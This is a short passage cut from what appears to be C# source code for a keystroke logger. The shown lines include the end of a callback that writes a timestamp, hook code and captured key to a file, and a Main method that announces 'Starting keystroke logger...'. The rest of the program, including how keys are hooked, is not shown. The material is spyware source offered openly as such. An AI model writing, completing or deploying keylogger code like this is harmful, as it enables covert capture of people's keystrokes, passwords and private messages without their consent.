                        {
                            writer.WriteLine("{0}, {1}, {2}", DateTime.Now, nCode, key);
                        }
                    }
                }
            }
        }
    }

    public static void Main(string[] args)
    {
        try
        {
            Console.WriteLine("Starting keystroke logger...");
